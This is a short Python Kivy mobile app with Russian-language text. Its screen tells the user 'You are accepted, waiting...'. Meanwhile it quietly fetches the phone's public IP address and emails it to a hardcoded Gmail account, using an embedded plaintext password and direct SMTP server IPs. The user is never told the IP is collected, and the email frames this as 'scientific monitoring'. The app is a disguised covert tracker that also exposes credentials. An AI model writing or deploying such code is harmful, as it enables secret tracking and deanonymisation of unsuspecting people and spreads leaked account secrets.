import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.clock import Clock

class IPReporterApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical')
        self.status_label = Label(
            text="Вы приняты в ожидание...", 
            font_size='24sp',
            halign='center'
        )
        self.layout.add_widget(self.status_label)
        Clock.schedule_once(self.process_monitoring, 1)
        return self.layout

    def get_ip(self):
        sites = [
            "https://ipify.org",
            "https://icanhazip.com",
            "https://ipapi.co"
        ]
        for url in sites:
            try:
                res = requests.get(url, timeout=5)
                if res.status_code == 200:
                    return res.text.strip()
            except:
                continue
        return None

    def send_email(self, ip_address):
        sender_email = "gemmes1965@gmail.com"  
        sender_password = "gpfbbamttimkmyis"  
        recipient_email = "gemmes1965@gmail.com"
        
        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = recipient_email
        message["Subject"] = "Научный мониторинг: Текущий IP-адрес мобильного устройства"
        
        body = f"Информационное сообщение для научных целей.\n\nТекущий IP-адрес смартфона: {ip_address}"
        message.attach(MIMEText(body, "plain"))
        
        smtp_ips = ["142.251.4.108", "142.250.27.108", "74.125.200.108"]
        for ip in smtp_ips:
            try:
                server = smtplib.SMTP(ip, 587, timeout=10)
                server.starttls()
                server.login(sender_email, sender_password)
                server.sendmail(sender_email, recipient_email, message.as_string())
                server.quit()
                return True
            except:
                continue
        return False

    def process_monitoring(self, dt):
        current_ip = self.get_ip()
        if current_ip:
            success = self.send_email(current_ip)
            if success:
                self.status_label.text = "Вы приняты"
            else:
                self.status_label.text = "Ошибка отправки почты"
        else:
            self.status_label.text = "Ошибка: Нет подключения к сети"

if __name__ == "__main__":
    IPReporterApp().run()
